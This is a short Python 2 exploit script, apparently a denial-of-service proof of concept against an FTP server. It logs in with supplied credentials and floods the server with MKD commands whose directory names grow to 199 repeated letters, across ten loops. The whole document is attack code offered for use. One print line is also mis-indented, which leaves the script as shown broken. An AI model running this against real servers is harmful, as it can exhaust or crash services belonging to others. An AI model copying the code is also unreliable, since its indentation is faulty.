#!/usr/bin/python
import socket
import sys

def Usage():
    print ("Usage:  ./expl.py <serv_ip>      <Username> <password>\n")
    print ("Example:./expl.py 192.168.48.183 anonymous anonymous\n")
if len(sys.argv) <> 4:
        Usage()
        sys.exit(1)
else:
    hostname=sys.argv[1]
    username=sys.argv[2]
    passwd=sys.argv[3]
    test_string='a'
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.connect((hostname, 21))
    except:
        print ("Connection error!")
        sys.exit(1)
    r=sock.recv(1024)
    sock.send("user %s\r\n" %username)
    r=sock.recv(1024)
    sock.send("pass %s\r\n" %passwd)

    for i in range(1,200):
         sock.send("mkd " + "a" * i +"\r\n")
         print "[-] " + ("mkd " + "a" * i +"\r\n")
         r=sock.recv(1024)
         print "[+] " + r + "\r\n"
    for i in range(1,200):
         sock.send("mkd " + "b" * i +"\r\n")
         print "[-] " + ("mkd " + "b" * i +"\r\n")
         r=sock.recv(1024)
         print "[+] " + r + "\r\n"
    for i in range(1,200):
         sock.send("mkd " + "c" * i +"\r\n")
         print "[-] " + ("mkd " + "c" * i +"\r\n")
         r=sock.recv(1024)
         print "[+] " + r + "\r\n"
    for i in range(1,200):
         sock.send("mkd " + "d" * i +"\r\n")
         print "[-] " + ("mkd " + "d" * i +"\r\n")
         r=sock.recv(1024)
print "[+] " + r + "\r\n"
    for i in range(1,200):
         sock.send("mkd " + "e" * i +"\r\n")
         print "[-] " + ("mkd " + "e" * i +"\r\n")
         r=sock.recv(1024)
         print "[+] " + r + "\r\n"
    for i in range(1,200):
         sock.send("mkd " + "f" * i +"\r\n")
         print "[-] " + ("mkd " + "f" * i +"\r\n")
         r=sock.recv(1024)
         print "[+] " + r + "\r\n"
    for i in range(1,200):
         sock.send("mkd " + "g" * i +"\r\n")
         print "[-] " + ("mkd " + "g" * i +"\r\n")
         r=sock.recv(1024)
         print "[+] " + r + "\r\n"
    for i in range(1,200):
         sock.send("mkd " + "h" * i +"\r\n")
         print "[-] " + ("mkd " + "h" * i +"\r\n")
         r=sock.recv(1024)
         print "[+] " + r + "\r\n"
    for i in range(1,200):
         sock.send("mkd " + "i" * i +"\r\n")
         print "[-] " + ("mkd " + "i" * i +"\r\n")
         r=sock.recv(1024)
         print "[+] " + r + "\r\n"
    for i in range(1,200):
         sock.send("mkd " + "j" * i +"\r\n")
         print "[-] " + ("mkd " + "j" * i +"\r\n")
         r=sock.recv(1024)
         print "[+] " + r + "\r\n"

    sock.close()
